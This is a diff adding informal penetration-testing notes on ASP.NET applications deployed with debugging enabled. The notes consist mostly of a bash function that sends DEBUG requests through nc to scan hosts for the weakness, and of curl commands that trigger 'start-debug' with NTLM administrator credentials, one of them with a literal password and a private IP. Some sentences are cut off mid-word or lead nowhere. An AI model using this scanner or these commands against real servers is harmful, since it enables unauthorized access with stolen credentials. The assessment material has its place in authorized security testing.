@@ -1,0 +1,52 @@
+during an assessment of an ASP.NET it became evident the application allowed for debugging. This is the case
+if the application developer never changed the web.config setting for production (often the case) and they suspect
+since the application is local, or what ever the reason, this is not a threat - well, it is.. here is why
+
+Lets say you have compromised a syste
+
+first lets discover some systems which may be vulnerable:
+
+ASPCheckDebug() {
+  results=`echo -e "DEBUG $3 HTTP/1.1\nHost: $1\nCommand: stop-debug\nConnection: close\n\n\n" | \
+    nc -v $1 $2 2>/dev/null` ;
+  status=`echo $results | \
+    head -n1 | \
+    cut -d " " -f2`; 
+  if (("$status" == 200)); 
+    then 
+      echo -e "[PERMITTED ACCESS]\tVulnerable to ASP.NET Remote Debugging"; 
+  fi;
+  if (("$status" == 403));
+    then 
+      echo -e "[FORBIDDEN ACCESS]\tMAYBE Vulnerable to ASP.NET Remote Debugging";
+  fi;
+} ## ASPCheckDebug 4.5.6.7 80 /somedirector/MyASPApp.aspx
+
+This function takes three arguments:
+
+   Argument 1: IP or DNS name
+   Argument 2: Port of the service
+   Argument 3: Path to the application file
+   
+   Example: ASPCheckDebug 4.5.6.7 80 /somedirector/somefile
+
+You will be presented some output to help idenitfy if the DEBUG is enabled on the remote system
+
+    [PERMITTED ACCESS]	Vulnerable to ASP.NET Remote Debugging
+    [FORBIDDEN ACCESS]	MAYBE Vulnerable to ASP.NET Remote Debugging
+
+Want to scan a list of systems, ok ...
+
+
+Let's say there needs to be more proof of the weakness and you have found credentials for this system...
+
+you can perform an NTLM Authetnication with (curl|wget), but we will use culr here..
+
+curl -H $'Command: start-debug' \
+  -k -v --ntlm \
+  -u "SOME_SERVER\\Administrator:PLAINTEXTHERE" \
+  "http://<TARGET>/<DIR>/<EXISTING_FILE>"
+
+
+
+curl -H $'Command: start-debug' -k -v --ntlm -u "ONGUARD-SERVER\\Administrator:testuser1!" "http://172.16.159.133/AdminApp/Default.aspx" && echo
